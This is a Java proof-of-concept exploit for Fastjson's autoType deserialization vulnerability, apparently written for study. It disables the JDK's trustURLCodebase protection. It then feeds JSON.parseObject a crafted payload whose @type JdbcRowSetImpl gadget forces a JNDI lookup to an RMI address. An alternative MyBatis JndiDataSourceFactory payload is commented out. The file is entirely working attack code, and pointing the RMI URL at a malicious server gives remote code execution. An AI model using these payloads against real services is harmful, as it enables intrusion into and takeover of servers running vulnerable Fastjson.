import com.alibaba.fastjson.JSON;

public class Main {

    public static void main(String[] argv) {

        // 触发漏洞
        //JDK 8u121以后版本需要设置改系统变量
        System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true");



        // 基于 com.sun.rowset.JdbcRowSetImpl
        String payload = "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://127.0.0.1:1099/test\",\"autoCommit\":true}";

        // 基于 org.apache.ibatis.datasource.jndi.JndiDataSourceFactory
        // String payload = "{\"@type\":\"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory\",\"properties\":{\"data_source\":\"rmi://127.0.0.1:1099/test\"}}";


        JSON.parseObject(payload);
    }
}
